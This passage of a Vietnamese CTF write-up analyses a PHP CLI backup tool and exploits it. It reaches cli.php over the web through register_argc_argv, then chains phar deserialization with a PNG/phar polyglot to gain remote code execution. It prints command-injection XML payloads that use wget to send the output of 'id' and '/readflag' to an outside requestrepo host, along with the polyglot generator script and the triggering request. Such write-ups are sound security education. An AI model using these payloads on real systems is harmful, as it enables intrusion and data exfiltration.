+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>function isConfig($probableConfig) {
+</span></span><span class=line><span class=cl>    if (!$probableConfig) {
+</span></span><span class=line><span class=cl>        return null;
+</span></span><span class=line><span class=cl>    }
+</span></span><span class=line><span class=cl>    if (is_dir($probableConfig)) {
+</span></span><span class=line><span class=cl>        return isConfig($probableConfig.\DIRECTORY_SEPARATOR.&#39;config.xml&#39;);
+</span></span><span class=line><span class=cl>    }
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    if (file_exists($probableConfig)) {
+</span></span><span class=line><span class=cl>        return $probableConfig;
+</span></span><span class=line><span class=cl>    }
+</span></span><span class=line><span class=cl>    if (file_exists($probableConfig.&#39;.xml&#39;)) {
+</span></span><span class=line><span class=cl>        return $probableConfig.&#39;.xml&#39;;
+</span></span><span class=line><span class=cl>    }
+</span></span><span class=line><span class=cl>    return null;
+</span></span><span class=line><span class=cl>};
+</span></span></code></pre></td></tr></table></div></div><p>Sau khi đã xác định file config có tồn tại, file mới được đưa vào xử lý:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=n>function</span> <span class=n>getConfig</span><span class=p>(</span><span class=o>$</span><span class=n>name</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=o>$</span><span class=n>configFilename</span> <span class=o>=</span> <span class=n>isConfig</span><span class=p>(</span><span class=n>getCommandLineValue</span><span class=p>(</span><span class=s2>&#34;--config&#34;</span><span class=p>,</span> <span class=s2>&#34;-c&#34;</span><span class=p>));</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=o>$</span><span class=n>configFilename</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=o>$</span><span class=n>dbConfig</span> <span class=o>=</span> <span class=n>new</span> <span class=n>DOMDocument</span><span class=p>();</span>
+</span></span><span class=line><span class=cl>        <span class=o>$</span><span class=n>dbConfig</span><span class=o>-&gt;</span><span class=nb>load</span><span class=p>(</span><span class=o>$</span><span class=n>configFilename</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>        <span class=o>$</span><span class=k>var</span> <span class=o>=</span> <span class=n>new</span> <span class=n>DOMXPath</span><span class=p>(</span><span class=o>$</span><span class=n>dbConfig</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>        <span class=n>foreach</span> <span class=p>(</span><span class=o>$</span><span class=k>var</span><span class=o>-&gt;</span><span class=n>query</span><span class=p>(</span><span class=s1>&#39;/config/db[@name=&#34;&#39;</span><span class=o>.$</span><span class=n>name</span><span class=o>.</span><span class=s1>&#39;&#34;]&#39;</span><span class=p>)</span> <span class=n>as</span> <span class=o>$</span><span class=k>var</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=o>$</span><span class=k>var</span><span class=o>-&gt;</span><span class=n>getAttribute</span><span class=p>(</span><span class=s1>&#39;value&#39;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>        <span class=p>}</span>
+</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>null</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>null</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span></code></pre></td></tr></table></div></div><ul><li>Sử dụng DOMDocument() để load file config, sau đó query lấy giá trị từ thẻ gốc <code>&lt;config></code>-><code>&lt;db></code>, lấy attribute <code>name</code> lưu vào biến $vars và lấy attribute <code>value</code> của name tương ứng.</li><li>Ta cũng có format của một file config sẽ như thế nào:</li></ul><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>&lt;config&gt;
+</span></span><span class=line><span class=cl>    &lt;db name=&#34;username&#34; value=&#34;root&#34;/&gt;
+</span></span><span class=line><span class=cl>    &lt;db name=&#34;password&#34; value=&#34;root&#34;/&gt;
+</span></span><span class=line><span class=cl>    &lt;db name=&#34;database&#34; value=&#34;&#34;/&gt;
+</span></span><span class=line><span class=cl>&lt;/config&gt;
+</span></span></code></pre></td></tr></table></div></div><p>Hàm <code>generateFilename</code> dùng để tạo ra tên file ngẫu nhiên khi sử dụng method backup:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>function generateFilename() {
+</span></span><span class=line><span class=cl>    $timestamp = date(&#34;Ymd_His&#34;);
+</span></span><span class=line><span class=cl>    $random = bin2hex(random_bytes(4));
+</span></span><span class=line><span class=cl>    $filename = &#34;backup_$timestamp&#34; . &#34;_$random.sql&#34;;
+</span></span><span class=line><span class=cl>    return $filename;
+</span></span><span class=line><span class=cl>}
+</span></span></code></pre></td></tr></table></div></div><p>=> Kết quả cho ra file sql backup với filename sử dụng kết hợp ngày tháng và 8 ký tự random</p><ol><li>Method backup</li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>function backup($filename, $username, $password, $database) {
+</span></span><span class=line><span class=cl>    $backupdir = &#34;/tmp/backup/&#34;;
+</span></span><span class=line><span class=cl>    passthruOrFail(&#34;mysqldump -u$username -p$password $database &gt; $backupdir$filename&#34;);
+</span></span><span class=line><span class=cl>}
+</span></span></code></pre></td></tr></table></div></div><ul><li>Tại method này, server thực thi câu lệnh dump toàn bộ database vào file được quy định trước, với tên filename gen random; 3 giá trị username, password và database được lấy từ file config</li></ul><ol start=2><li>Method import</li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>function import($filename, $username, $password, $database) {
+</span></span><span class=line><span class=cl>    passthruOrFail(&#34;mysql -u$username -p$password $database &lt; $filename&#34;);
+</span></span><span class=line><span class=cl>}
+</span></span></code></pre></td></tr></table></div></div><ul><li>Tiếp tục sử dụng câu lệnh hệ thống đưa dữ liệu của filename được chỉ định vào database</li></ul><ol start=3><li>Method healthcheck:</li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>function healthCheck() {
+</span></span><span class=line><span class=cl>    $url = &#39;http://localhost:80/info&#39;;
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    $headers = get_headers($url);
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    $responseCode = intval(substr($headers[0], 9, 3));
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    if ($responseCode === 200) {
+</span></span><span class=line><span class=cl>        echo &#34;[+] Daijobu\n&#34;;
+</span></span><span class=line><span class=cl>    } else {
+</span></span><span class=line><span class=cl>        echo &#34;[-] Not Daijobu :(\n&#34;;
+</span></span><span class=line><span class=cl>    }
+</span></span><span class=line><span class=cl>}
+</span></span></code></pre></td></tr></table></div></div><ul><li>Hàm truy cập đến path info dùng để hiển thị phpinfo() và lấy status code trả về thông qua header. Nếu 200 thì coi là ổn, khác thì bị coi là không ổn</li></ul><p>=> Method backup và import có khả năng command injection nếu như control được giá trị trong file config. Còn với option -f thì không chắc vì nó cũng bị kiểm tra bằng <code>file_exists</code> nên không thể command injection sau filename được.</p><h2 id=khai-thác>Khai Thác</h2><h3 id=command-injection-in-cliphp>Command Injection in cli.php</h3><p>Mình mất một lúc để nhận ra có thể truy cập đến cli.php thông qua website /cli/cli.php. Nên mình đang nghĩ đến command injection vào các method, nhưng làm thế nào để bypass sử dụng trên command line?
+Đang tìm cách thì teammates của mình phát hiện ra tại php.ini giá trị <code>register_argc_argv</code> đã bị comment: Giá trị này được mặc định là off, nếu như config này được kích hoạt thì mình hoàn toàn có thể truyền vào giá trị của 2 biến này thông qua dấu <code>+</code> thay vì dùng dấu <code>&</code> để ngăn cách.<br><img src=https://hackmd.io/_uploads/HkoZro1EC.png loading=lazy alt=image><br><img src=https://hackmd.io/_uploads/SkXyOoJN0.png loading=lazy alt=image><br>Vậy thì mình có thể lợi dụng việc này để truyền giá trị vào các tham số -m và -c, thực thi file cli.php như đang ở command line, mình truy cập thử đến mode healthcheck thì thấy file hoàn toàn có thể thực thi được:
+<img src=https://hackmd.io/_uploads/HyCfLjyE0.png loading=lazy alt=image><br>Mình quyết định sẽ lấy mode backup làm sink để RCE, với việc sử dụng DOMXPath query lấy dự liệu từ file xml, mình tạm thời bỏ qua việc upload file lên như nào mà craft một file xml để command injection vào username:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>&lt;config&gt;
+</span></span><span class=line><span class=cl>    &lt;db name=&#34;username&#34; value=&#39;|| wget --post-data &#34;$(id)&#34; -O- ut8mgeo8.requestrepo.com ||&#39;/&gt;
+</span></span><span class=line><span class=cl>    &lt;db name=&#34;password&#34; value=&#34;root&#34;/&gt;
+</span></span><span class=line><span class=cl>    &lt;db name=&#34;database&#34; value=&#34;&#34;/&gt;
+</span></span><span class=line><span class=cl>&lt;/config&gt;
+</span></span></code></pre></td></tr></table></div></div><p>Để tránh câu lệnh bị thực thi khi echo vào thì mình base64 trước rồi truyền vào a.xml
+<img src=https://hackmd.io/_uploads/HJFQdoJE0.png loading=lazy alt=image><br>Thử truyền vào method backup và tên file config là: /tmp/a.xml
+<img src=https://hackmd.io/_uploads/SybD_oJ40.png loading=lazy alt=image><br>Và mình thấy kết quả trả về requestrepo, đây là sink đúng để có thể RCE:
+<img src=https://hackmd.io/_uploads/BJmt_i1VA.png loading=lazy alt=image><br>Oke vậy là đã có chỗ để RCE, vấn đề còn lại là upload file xml này lên như nào với cái rule whitelist kia thôi.</p><h3 id=race-condition>Race Condition??</h3><p>Như mình đã nói ở trên, có 2 thứ mà mình thấy mình chưa sử dụng được trong challenge này, thứ nhất là trang phpinfo, và thứ 2 là cái print_r hiện thông tin của file. Khi PHP script nhận được một file request, file đó sẽ được lưu tạm thời trong thư mục /tmp và có thể tùy chỉnh trong php.ini. Trong trường hợp này sẽ là /tmp/php+6 ký tự [a-zA-Z0-9]. File trong thư mục tmp sẽ biến mất sau khi có sự xuất hiện của hàm <code>move_uploaded_file</code> hoặc khi PHP script đó kết thúc. Nghe ná ná giống với case LFI2RCE với phpinfo nên mình và teammate triển luôn theo hướng này.
+Bọn mình dự định sẽ upload file sau đó vào phpinfo để xem đường dẫn file tmp, rồi sử dụng mode backup để command injection. Nhưng sau khi thử rất nhiều lần không được, mình đã đi tìm hiểu kĩ hơn và nhận ra mình đã sai và chưa hiểu bản chất: Lỗi LFI2RCE với phpinfo xảy ra khi mình có thể upload file tại trang phpinfo luôn, tức là có thể sử dụng POST request. PHP sẽ lưu các file được upload lên thư mục temp đối với cả các PHP script không hề hỗ trợ xử lý file trong nó, còn ở đây mình chỉ có thể GET /info, nên cách này coi như tiêu tùng. Ref: <a class=link href=http://dann.com.br/php-winning-the-race-condition-vs-temporary-file-upload-alternative-way-to-easy_php-n1ctf2018/ target=_blank rel=noopener>http://dann.com.br/php-winning-the-race-condition-vs-temporary-file-upload-alternative-way-to-easy_php-n1ctf2018/</a>
+Không từ bỏ việc race, mình quyết định đánh vào khả năng print_r mảng về thông tin file khi upload file tại <code>/addProduct</code>, nhưng việc này cũng bất khả thi vì file đã được xử xong xuôi hết r mới có response trả về cho mình, mình đã tốn 2 ngày để thử theo phương pháp này và không thu được kết quả gì, vậy là challenge đã không thể solve kịp trước khi cuộc thi kết thúc :((</p><h3 id=the-right-path-phar-deserialization>The right path: Phar Deserialization</h3><p>Mình cứ mải đi race mà không nghĩ ra DOMDocument hỗ trợ cả file phar, tương tự như trong case <a class=link href=https://blog.efiens.com/post/doublevkay/xxe-to-phar-deserialization/ target=_blank rel=noopener>XXE to Phar Deserialize</a> khi DOMDocument->loadXML có thể truyền vào phar protocol thì ở đây, DOMDocument->load cũng có thể truyền vào phar protocol -> +1 kiến thức.
+Thiên thời địa lợi nhân hòa, config phar.readonly cũng được tắt => có thể deser file phar:<br><img src=https://hackmd.io/_uploads/ByzNl3kNR.png loading=lazy alt=image><br>Nếu như đã hỗ trợ deser phar file, thì mình chỉ cần để file xml của mình vào file phar và nhét vào 1 file ảnh valid là được. Về cách gen file phar như nào thì mình sẽ làm tương tự như chall upload phar file trong root me. Ref: <a class=link href=https://thanhlocpanda.wordpress.com/2023/08/07/php-phar-jpeg-polyglot-javascript-jpeg-polyglot-root-me-part-ii/ target=_blank rel=noopener>https://thanhlocpanda.wordpress.com/2023/08/07/php-phar-jpeg-polyglot-javascript-jpeg-polyglot-root-me-part-ii/</a> (pass: thanhlocpanda)
+Đường đi nước bước đã đủ, mình tổng hợp lại attack chain như sau:</p><ul><li>Gen file ảnh càng ngắn càng tốt</li><li>Lấy hex của file đó, đắp vào file phar, chèn xml vào file phar và đổi extension về ảnh</li><li>Upload file ảnh, lấy đường dẫn ảnh</li><li>Gọi đến cli.php, sử dụng phar:// protocol gọi đến file xml nằm trong file phar => RCE</li></ul><h3 id=final-exploit>Final Exploit</h3><p>Mình gen ảnh 1 pixel cho nó bé bằng đoạn code:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>from PIL import Image
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>img = Image.new(&#34;RGB&#34;, (1,1), (255,255,255))
+</span></span><span class=line><span class=cl>img.save(&#34;gen.png&#34;)
+</span></span></code></pre></td></tr></table></div></div><p>Mình lấy hex bằng cyberchef và được chuỗi:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>\x89\x50\x4e\x47\x0d\x0a\x1a\x0a\x00\x00\x00\x0d\x49\x48\x44\x52\x00\x00\x00\x01\x00\x00\x00\x01\x08\x02\x00\x00\x00\x90\x77\x53\xde\x00\x00\x00\x0c\x49\x44\x41\x54\x78\x9c\x63\xf8\xff\xff\x3f\x00\x05\xfe\x02\xfe\x0d\xef\x46\xb8\x00\x00\x00\x00\x49\x45\x4e\x44\xae\x42\x60\x82
+</span></span></code></pre></td></tr></table></div></div><p>Đưa chuỗi vào scrip gen file phar, mình nhét file a.xml với payload đọc flag bằng <code>/readflag</code> vào trong file phar, rồi đổi tên file thành phar.png:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>&lt;?php
+</span></span><span class=line><span class=cl>    $png = &#34;\x89\x50\x4e\x47\x0d\x0a\x1a\x0a\x00\x00\x00\x0d\x49\x48\x44\x52\x00\x00\x00\x01\x00\x00\x00\x01\x08\x02\x00\x00\x00\x90\x77\x53\xde\x00\x00\x00\x0c\x49\x44\x41\x54\x78\x9c\x63\xf8\xff\xff\x3f\x00\x05\xfe\x02\xfe\x0d\xef\x46\xb8\x00\x00\x00\x00\x49\x45\x4e\x44\xae\x42\x60\x82&#34;;
+</span></span><span class=line><span class=cl>    $xml_data = &#34;&lt;config&gt;&lt;db name=\&#34;username\&#34; value=&#39;|| wget --post-data \&#34;$(/readflag)\&#34; -O- ut8mgeo8.requestrepo.com ||&#39;/&gt;&lt;db name=\&#34;password\&#34; value=\&#34;root\&#34;/&gt;&lt;db name=\&#34;database\&#34; value=\&#34;\&#34;/&gt;&lt;/config&gt;&#34;;
+</span></span><span class=line><span class=cl>    $phar = new Phar(&#34;phar.phar&#34;);
+</span></span><span class=line><span class=cl>    $phar-&gt;startBuffering();
+</span></span><span class=line><span class=cl>    $phar-&gt;addFromString(&#34;a.xml&#34;, $xml_data);
+</span></span><span class=line><span class=cl>    $phar-&gt;setStub($png.&#34;__HALT_COMPILER(); ?&gt;&#34;);
+</span></span><span class=line><span class=cl>    $phar-&gt;stopBuffering();
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    rename(&#39;phar.phar&#39;, &#39;phar.png&#39;);
+</span></span><span class=line><span class=cl>?&gt;
+</span></span></code></pre></td></tr></table></div></div><p>Upload file phar lên server thành công:
+<img src=https://hackmd.io/_uploads/B1NAW3J4C.png loading=lazy alt=image><br>Vào list product để lấy tên ảnh, của mình là <code>/uploads/3e10700de9433bdb.png</code>
+Request đến cli.php để lụm flag thôi:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=n>GET</span> <span class=o>/</span><span class=n>cli</span><span class=o>/</span><span class=n>cli</span><span class=o>.</span><span class=n>php</span><span class=err>?</span><span class=o>-</span><span class=n>m</span><span class=o>+</span><span class=n>backup</span><span class=o>+-</span><span class=n>c</span><span class=o>+</span><span class=n>phar</span><span class=p>:</span><span class=o>///</span><span class=n>www</span><span class=o>/</span><span class=n>uploads</span><span class=o>/</span><span class=mf>3e10700</span><span class=n>de9433bdb</span><span class=o>.</span><span class=n>png</span><span class=o>/</span><span class=n>a</span><span class=o>.</span><span class=n>xml</span>
+</span></span></code></pre></td></tr></table></div></div><p><img src=https://hackmd.io/_uploads/Sk35G3yNC.png loading=lazy alt=image><br><img src=https://hackmd.io/_uploads/rkSiM3yEC.png loading=lazy alt=image><br></p></section><footer class=article-footer><section class=article-tags><a href=/tags/ctf/>CTF</a></section><section class=article-copyright><svg class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><path d="M14.5 9a3.5 4 0 100 6"/></svg>
+<span>Licensed under CC BY-NC-SA 4.0</span></section></footer></article><div class=disqus-container><div id=disqus_thread></div><script>window.disqus_config=function(){},function(){if(["localhost","127.0.0.1"].indexOf(window.location.hostname)!=-1){document.getElementById("disqus_thread").innerHTML="Disqus comments not available by default when the website is previewed locally.";return}var t=document,e=t.createElement("script");e.async=!0,e.src="//hugo-theme-stack.disqus.com/embed.js",e.setAttribute("data-timestamp",+new Date),(t.head||t.body).appendChild(e)}()</script><noscript>Please enable JavaScript to view the <a href=https://disqus.com/?ref_noscript>comments powered by Disqus.</a></noscript><a href=https://disqus.com class=dsq-brlink>comments powered by <span class=logo-disqus>Disqus</span></a></div><style>.disqus-container{background-color:var(--card-background);border-radius:var(--card-border-radius);box-shadow:var(--shadow-l1);padding:var(--card-padding)}</style><script>window.addEventListener("onColorSchemeChange",e=>{typeof DISQUS=="object"&&DISQUS.reset({reload:!0})})</script><footer class=site-footer><section class=copyright>&copy;
+2020 -
+2026 kev1n's Blog</section><section class=powerby>Built with <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a><br>Theme <b><a href=https://github.com/CaiJimmy/hugo-theme-stack target=_blank rel=noopener data-version=3.33.0>Stack</a></b> designed by <a href=https://jimmycai.com target=_blank rel=noopener>Jimmy</a></section></footer><div class=pswp tabindex=-1 role=dialog aria-hidden=true><div class=pswp__bg></div><div class=pswp__scroll-wrap><div class=pswp__container><div class=pswp__item></div><div class=pswp__item></div><div class=pswp__item></div></div><div class="pswp__ui pswp__ui--hidden"><div class=pswp__top-bar><div class=pswp__counter></div><button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+<button class="pswp__button pswp__button--share" title=Share></button>
+<button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+<button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button><div class=pswp__preloader><div class=pswp__preloader__icn><div class=pswp__preloader__cut><div class=pswp__preloader__donut></div></div></div></div></div><div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap"><div class=pswp__share-tooltip></div></div><button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+</button>
+<button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)"></button><div class=pswp__caption><div class=pswp__caption__center></div></div></div></div></div><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo=" crossorigin=anonymous defer></script><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU=" crossorigin=anonymous defer></script><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css crossorigin=anonymous><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css crossorigin=anonymous></main></div><script src=https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z+KMkF24hUW8WePSA9HM=" crossorigin=anonymous></script><script type=text/javascript src=/ts/main.c922af694cc257bf1ecc41c0dd7b0430f9114ec280ccf67cd2c6ad55f5316c4e.js defer></script><script>(function(){const e=document.createElement("link");e.href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap",e.type="text/css",e.rel="stylesheet",document.head.appendChild(e)})()</script></body></html>
